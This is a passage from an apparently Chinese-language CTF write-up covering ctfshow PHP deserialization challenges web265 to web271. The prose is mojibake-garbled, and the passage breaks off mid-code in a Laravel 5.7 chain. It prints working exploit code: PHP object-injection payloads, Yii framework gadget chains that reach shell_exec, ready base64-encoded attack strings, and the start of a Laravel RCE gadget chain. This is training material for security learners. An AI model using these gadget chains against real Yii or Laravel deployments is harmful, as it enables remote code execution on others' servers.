<span class="token operator">?</span>f<span class="token operator">=</span>aaa<span class="token operator">&amp;</span>m<span class="token operator">=</span>bbb<span class="token operator">&amp;</span>t<span class="token operator">=</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string double-quoted-string">";s:5:"</span>token<span class="token string double-quoted-string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åœ¨å‘index.phpå‘é€ä¹‹åå¾—åˆ°å›æ˜¾Your message has been sentï¼Œç„¶åè®¿é—®message.phpï¼ˆè®°å¾—CookieåŠ ä¸Šmsgï¼‰å¾—åˆ°flag</p><h4 id="web265-å¼•ç”¨"><a href="#web265-å¼•ç”¨" class="headerlink" title="web265(å¼•ç”¨ &amp;)"></a>web265(å¼•ç”¨ &amp;)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¦‚æœè¦é è¾“å…¥çš„ <code>$password</code> å»å’Œ <code>md5(mt_rand())</code> ç¢°æ’ï¼Œå‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚è¿™é‡Œéœ€è¦ç”¨åˆ° <code>php</code> çš„å¼•ç”¨ï¼Œä½¿å¾— <code>$password = </code></p><p><code>&amp;$token;</code>ï¼Œé‚£ä¹ˆ <code>$password === $token</code> å°±æ²¡é—®é¢˜äº†ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payloadï¼š<span class="token operator">?</span>ctfshow<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A12<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowAdmin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>token<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BR<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web266-PHPå¤§å°å†™"><a href="#web266-PHPå¤§å°å†™" class="headerlink" title="web266( PHPå¤§å°å†™)"></a>web266( PHPå¤§å°å†™)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cs</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshowo</span><span class="token operator">=</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error <span class="token interpolation"><span class="token variable">$ctfshowo</span></span>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong><a href="https://blog.csdn.net/qq_41445224/article/details/88890323">file_get_contents(â€˜php:&#x2F;&#x2F;inputâ€™)</a></strong></p><p>åœ¨ç”¨phpå†™æ¥å£çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå°†è¯·æ±‚çš„æ•°æ®é€šè¿‡jsonçš„å½¢å¼å‘é€åˆ°æŒ‡å®šçš„è¯·æ±‚åœ°å€å¤„ï¼Œæ­¤æ—¶çš„file_get_contents(â€˜php:&#x2F;&#x2F;inputâ€™)<br>ä¸»è¦æ˜¯ç”¨æ¥è·å–è¯·æ±‚çš„åŸå§‹æ•°æ®</p><p>å…¶ä¸POSTçš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token variable">$_POST</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>â€œnameâ€<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> â€œzhangsanâ€ <span class="token punctuation">[</span>â€œpwdâ€<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> â€œzhangsanâ€ <span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>php<span class="token punctuation">:</span><span class="token comment">//input-------------</span>name<span class="token operator">=</span>zhangsan<span class="token operator">&amp;</span>pwd<span class="token operator">=</span>zhangsan</code></pre><p>åªè¦åºåˆ—åŒ–ctfshowç±»è®©ä»–ååºåˆ—ä¹‹åè§¦å‘__destruct()å‡½æ•°å³å¯å¾—åˆ°flag</p><p>ç”±äºè¿‡æ»¤äº†<code>ctfshow</code>ä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯<code>cTFSHOW</code>ï¼Œåœ¨PHPä¸­ï¼Œç±»ä¸åŒºåˆ†å¤§å°å†™ï¼›æ‰€ä»¥ç»•è¿‡äº†è¿‡æ»¤ã€‚</p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ª <code>php</code> å¸¸è¯†ï¼š<a href="https://www.cnblogs.com/zrp2013/p/3607581.html">PHPå¤§å°å†™ï¼šå‡½æ•°åå’Œç±»åä¸åŒºåˆ†,å˜é‡ååŒºåˆ†</a>ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cTFSHOW"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web267-Yiiæ¡†æ¶"><a href="#web267-Yiiæ¡†æ¶" class="headerlink" title="web267(Yiiæ¡†æ¶)"></a>web267(Yiiæ¡†æ¶)</h4><p>å¼±å¯†ç <code>admin/admin</code>ç™»é™†åï¼ŒAboutç•Œé¢å‘ç°æ³¨é‡Š<code>&lt;!--?view-source --&gt;</code></p><p>äºæ˜¯è®¿é—®<code>index.php?r=site/about&amp;view-source</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token comment">///backdoor/shell</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æœäº†ä¸€ä¸‹çŸ¥é“æ˜¯ <code>Yii</code> æ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ã€‚</p><p><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yiiååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cp /flag 3.txt'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™é‡Œ <code>system</code> ä¸èƒ½ç”¨ï¼Œç”¨äº† <code>shell_exec</code>ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">%</span><span class="token number">2</span>Fshell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6MTQ6ImNwIC9mbGFnIDMudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h4 id="web268-270-Yiiæ¡†æ¶"><a href="#web268-270-Yiiæ¡†æ¶" class="headerlink" title="web268-270(Yiiæ¡†æ¶)"></a>web268-270(Yiiæ¡†æ¶)</h4><p>åšæ³•ä¸€æ ·ä½†æ˜¯éœ€è¦ä¿®æ”¹pocï¼Œå› ä¸ºå­˜åœ¨è¿‡æ»¤ </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Action</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DbSession</span> <span class="token keyword">extends</span> <span class="token class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>BaseObject</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ­¤å¤„å†™å‘½ä»¤</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0<span class="token operator">=</span></code></pre><h4 id="web271-Laravel5-7-ååºåˆ—åŒ–æ¼æ´"><a href="#web271-Laravel5-7-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web271(Laravel5.7 ååºåˆ—åŒ–æ¼æ´)"></a>web271(Laravel5.7 ååºåˆ—åŒ–æ¼æ´)</h4><p><a href="https://blog.csdn.net/weixin_45678034/article/details/122292624">Laravel5.7ååºåˆ—åŒ–RCEæ¼æ´åˆ†æ</a></p><p>ç©ºæ ¼è¢«è¿‡æ»¤æ³¨æ„ä¿®æ”¹æœ€åçš„payload</p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">,</span><span class="token variable">$class</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span><span class="token operator">=</span><span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">attributes</span> <span class="token operator">=</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Application</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$hasBeenBootstrapped</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindings</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindings</span><span class="token operator">=</span><span class="token variable">$bind</span><span class="token punctuation">;</span>        <span class="token 